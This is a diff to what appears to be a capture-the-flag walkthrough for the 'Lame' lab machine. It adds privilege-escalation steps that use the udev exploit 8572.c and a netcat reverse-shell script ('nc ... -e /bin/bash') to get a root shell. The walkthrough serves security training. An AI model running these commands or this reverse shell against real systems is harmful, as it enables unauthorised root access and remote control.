@@ -17,6 +17,26 @@ distcc is kind of compilier and nmap has a script to exploit this vulnerability
 
 ![Lame_shell](https://user-images.githubusercontent.com/55708909/91429683-610c3480-e87c-11ea-959c-1d02e7e51b5b.png)
 
+For Priviledge Escalation we are going to use 2009-1185
+
+searchsploit -m 8572.c
+
+It require process id of udevd : ps -aux |grep devd
+
+As per this exploit the file run in tmp directory will be running with root priviledges.
+
+run
+#/bin/bash
+nc -nv 10.10.10.10 4444 -e /bin/bash
+
+transfer the file run in tmp directory and run these commands 
+
+./8572 2688 (as per my pc udevd PID. It can be differet for yours)
+
+and we get reverse connection on netcat at port 4444
+
+
+
 
 
 
